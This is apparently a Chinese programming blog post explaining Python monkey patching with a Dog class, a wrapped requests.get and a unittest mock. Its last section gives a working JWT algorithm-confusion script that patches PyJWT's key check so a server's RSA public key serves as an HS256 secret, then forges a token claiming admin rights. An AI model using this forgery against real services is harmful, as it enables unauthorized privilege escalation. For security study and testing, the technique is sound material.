
# Python Monkey Patching

## 什么是Monkey Patching？

`Monkey Patching`（猴子补丁）是一种在运行时动态修改类或模块的技术。这个术语来源于`guerrilla patch`（游击队补丁），后来演变成了`monkey patching`。它允许我们在不修改源代码的情况下，改变或扩展已有代码的行为。

## 为什么使用Monkey Patching？

1. **临时修复bug**：当发现第三方库的bug但无法立即更新时
2. **功能增强**：为现有代码添加新功能
3. **测试目的**：在测试中替换某些方法的行为
4. **性能优化**：替换某些方法的实现以提高性能

## 基本示例

```python
# 原始类
class Dog:
    def bark(self):
        return "Woof!"

# 创建实例
dog = Dog()
print(dog.bark())  # 输出: Woof!

# Monkey Patching
def loud_bark(self):
    return "WOOF! WOOF!"

# 替换原始方法
Dog.bark = loud_bark

# 现在所有Dog实例都会使用新方法
print(dog.bark())  # 输出: WOOF! WOOF!
```

## 实际应用示例

### 1. 修改第三方库的行为

```python
import requests

# 原始的requests.get方法
original_get = requests.get

def patched_get(*args, **kwargs):
    print("Making a request...")
    response = original_get(*args, **kwargs)
    print("Request completed!")
    return response

# 应用补丁
requests.get = patched_get

# 现在所有的requests.get调用都会打印额外信息
response = requests.get('https://api.example.com')
```

### 2. 测试中的Mock

```python
import unittest
from my_module import DatabaseConnection

class TestMyApp(unittest.TestCase):
    def setUp(self):
        # 保存原始方法
        self.original_connect = DatabaseConnection.connect
        
        # Mock连接方法
        def mock_connect(self):
            return "Mock connection established"
            
        DatabaseConnection.connect = mock_connect
    
    def tearDown(self):
        # 恢复原始方法
        DatabaseConnection.connect = self.original_connect
    
    def test_database_operations(self):
        db = DatabaseConnection()
        self.assertEqual(db.connect(), "Mock connection established")
```

### 3.允许高版本jwt使用公钥作为key

~~其实这才是写这篇文章的主要原因，为醋包饺子的典范了~~

在处理json web token时，如果服务端配置不当，将`RS256`加密的jwt直接使用公钥`HS256`解密，我们获得公钥之后就能直接未在jwt，从而得到高级权限

```python
import jwt
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("key")
args = parser.parse_args()

# 使用Monkey Patching绕过高版本的jwt将公钥作为key时的报错
jwt.algorithms.HMACAlgorithm.prepare_key = lambda self, key: jwt.utils.force_bytes(key) #type: ignore

token = jwt.encode(
    payload={
        "username": "qwer123",
        "password": "e10adc3949ba59abbe56e057f20f883e",
        "is_admin": True
    },
    key = open(args.key, 'rb').read(),
    algorithm='HS256'
)

print(token)
```